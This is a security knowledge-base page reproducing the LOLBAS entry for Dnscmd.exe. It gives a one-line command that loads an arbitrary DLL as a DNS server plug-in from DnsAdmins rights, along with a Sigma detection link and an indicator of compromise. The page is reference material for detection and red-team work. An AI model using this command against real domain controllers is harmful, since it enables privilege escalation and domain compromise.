---
title: "Dnscmd.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Dnscmd.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Dnscmd.exe"
functions:
  - "Execute"
attack_technique_ids:
  - "T1543.003"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dnscmd.exe

A command-line interface for managing DNS servers

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Dnscmd.yml

## Paths

- `C:\Windows\System32\Dnscmd.exe`
- `C:\Windows\SysWOW64\Dnscmd.exe`

## Commands

### 1. Execute

Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.

```cmd
dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
```

- Use Case: Remotely inject dll to dns server
- Privileges: DNS admin
- Operating System: Windows server
- ATT&CK: [[kb/attack/techniques/T1543-create_or_modify_system_process|T1543.003]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
- IOC: Dnscmd.exe loading dll from UNC/arbitrary path

## Resources

- {'Link': 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83'}
- {'Link': 'https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html'}
- {'Link': 'https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp'}
- {'Link': 'https://twitter.com/Hexacorn/status/994000792628719618'}
- {'Link': 'http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html'}

## Acknowledgements

- {'Person': 'Shay Ber'}
- {'Person': 'Dimitrios Slamaris', 'Handle': '@dim0x69'}
- {'Person': 'Nikhil SamratAshok', 'Handle': '@nikhil_mitt'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml)
